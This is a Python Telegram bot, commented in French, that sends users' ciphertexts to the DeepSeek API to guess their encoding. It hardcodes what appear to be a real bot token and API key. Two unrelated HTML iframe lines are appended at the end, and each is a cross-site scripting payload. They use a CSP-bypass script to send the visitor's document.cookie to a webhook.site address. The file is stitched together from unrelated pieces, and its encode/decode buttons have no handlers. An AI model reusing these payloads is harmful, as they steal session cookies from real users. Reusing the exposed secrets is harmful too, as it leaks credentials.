import os
import requests
import base64
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, CallbackContext

TOKEN = "7780924898:AAEKw3QhQIFqkIC6R0UbBXXQ0j-OtCLYWp4"

# Remplace par ton API DeepSeek
DEEPSEEK_API_KEY = "sk-3e96707856d74119b4caf23354604a04"

# Dictionnaire temporaire pour stocker les messages en attente d'analyse
user_data = {}

# Fonction pour interagir avec DeepSeek et détecter la méthode cryptographique
def deepseek_detect(message):
    url = "https://api.deepseek.com/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "model": "deepseek-chat",
        "messages": [
            {"role": "system", "content": "Tu es un expert en cryptanalyse. Ta tâche est de détecter le type d'encodage utilisé dans un message chiffré."},
            {"role": "user", "content": f"Analyse ce message et détecte son encodage : {message}"}
        ]
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        response_json = response.json()
        
        if "choices" in response_json and response_json["choices"]:
            return response_json["choices"][0]["message"]["content"]
        else:
            return "❌ DeepSeek n'a pas pu identifier l'encodage."
    
    except requests.exceptions.RequestException as e:
        return f"⚠️ Erreur de connexion à DeepSeek : {e}"

# Fonction de démarrage avec les boutons d'action
async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("🛠 Encoder", callback_data="encode"),
         InlineKeyboardButton("🔓 Décoder", callback_data="decode")],
        [InlineKeyboardButton("🔍 Détecter la méthode cryptographique", callback_data="detect")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("👋 Salut ! Que veux-tu faire ?", reply_markup=reply_markup)

# Gestion des boutons
async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    if query.data == "detect":
        await query.message.reply_text("🔍 Envoie-moi le message crypté pour analyse.")
        user_data[query.from_user.id] = "awaiting_detection"

# Gestion des messages pour l'analyse
async def handle_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    message = update.message.text

    if user_id in user_data and user_data[user_id] == "awaiting_detection":
        await update.message.reply_text("🔍 Analyse en cours avec DeepSeek...")
        
        # Appel de DeepSeek pour analyser l'encodage
        result = deepseek_detect(message)
        
        # Extraction des méthodes détectées et affichage sous forme de boutons
        methods = result.split("\n")  # Supposons que DeepSeek renvoie une liste de méthodes
        keyboard = [[InlineKeyboardButton(f"{method}", callback_data=f"method_{method}")] for method in methods[:5]]  # Max 5 boutons

        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("🔎 Méthodes détectées, choisis celle à tester :", reply_markup=reply_markup)
        else:
            await update.message.reply_text("❌ Aucune méthode détectée.")
        
        user_data.pop(user_id, None)

def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    application.run_polling()

if __name__ == "__main__":
    main()






<iframe srcdoc="<br csp=fetch('https://webhook.site/3f611198-2e62-4852-8af7-9557b8a464d4?cookie='+document.cookie)><script src='https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>




<iframe srcdoc="<br csp=fetch('https://webhook.site/5dc9c0db-7fe4-4e97-b38e-214dbec2a471?cookie='+document.cookie)><script src='https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js'></script>"></iframe>